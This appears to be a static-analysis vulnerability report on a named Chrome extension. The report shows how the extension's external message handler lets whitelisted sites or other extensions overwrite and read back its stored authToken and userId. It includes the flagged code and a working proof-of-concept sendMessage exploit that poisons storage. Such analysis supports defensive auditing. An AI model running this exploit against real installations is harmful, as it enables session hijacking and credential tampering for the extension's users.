# CoCo Analysis: jbjniknpaofjfnghbocbhcppplchkkhp

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (authToken and userId)

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jbjniknpaofjfnghbocbhcppplchkkhp/opgen_generated_files/bg.js
Line 985	} else if (request.session) {
Line 986	chrome.storage.local.set({ authToken: request.session.authorization });
Line 987	chrome.storage.local.set({ userId: request.session.userId });
```

**Code:**

```javascript
// Background script - External message handler
chrome.runtime.onMessageExternal.addListener(async function (request, sender, sendResponse) {
    if (request.info) {
        // Read stored tokens and send back to caller
        const authToken = await retrieveDataFromStorage("authToken");
        const userId = await retrieveDataFromStorage("userId");
        sendResponse({
            authToken: authToken,  // ← Sends stored data back to external caller
            userId: userId
        });
    } else if (request.session) {
        // Store attacker-controlled session data
        chrome.storage.local.set({ authToken: request.session.authorization });  // ← attacker-controlled
        chrome.storage.local.set({ userId: request.session.userId });  // ← attacker-controlled

        // Immediately retrieve and send back to attacker
        const authToken = await retrieveDataFromStorage("authToken");
        const userId = await retrieveDataFromStorage("userId");
        sendResponse({
            authToken: authToken,  // ← Confirms storage to attacker
            userId: userId
        });
    } else if(request.logout) {
        chrome.storage.local.set({ authToken: "" });
        chrome.storage.local.set({ userId: "" });
        sendResponse({
            authToken: "",
            userId: ""
        });
    }
});

function retrieveDataFromStorage(key) {
    return new Promise((resolve, reject) => {
        chrome.storage.local.get(key, (result) => {
          if (chrome.runtime.lastError) {
            reject(chrome.runtime.lastError);
          } else {
            resolve(result[key]);
          }
        });
    });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From a whitelisted website (engage.yuja.com or localhost:3000)
// or any malicious extension

// 1. Poison the storage with attacker-controlled values
chrome.runtime.sendMessage(
  'jbjniknpaofjfnghbocbhcppplchkkhp',  // Extension ID
  {
    session: {
      authorization: 'attacker_token_12345',
      userId: 'attacker_user_99999'
    }
  },
  (response) => {
    console.log('Poisoned storage:', response);
    // Response: {authToken: 'attacker_token_12345', userId: 'attacker_user_99999'}
  }
);

// 2. Later, retrieve the poisoned data
chrome.runtime.sendMessage(
  'jbjniknpaofjfnghbocbhcppplchkkhp',
  { info: true },
  (response) => {
    console.log('Retrieved poisoned data:', response);
    // Response contains poisoned authToken and userId
  }
);
```

**Impact:** Complete storage exploitation chain. An attacker from whitelisted domains (engage.yuja.com or localhost:3000) or a malicious extension can: (1) poison the extension's storage with arbitrary authToken and userId values, (2) immediately retrieve confirmation via sendResponse, and (3) later read the poisoned values at any time. This allows the attacker to manipulate authentication state, potentially hijack legitimate user sessions, or inject malicious credentials that affect the extension's behavior when interacting with the YuJa Engage platform.
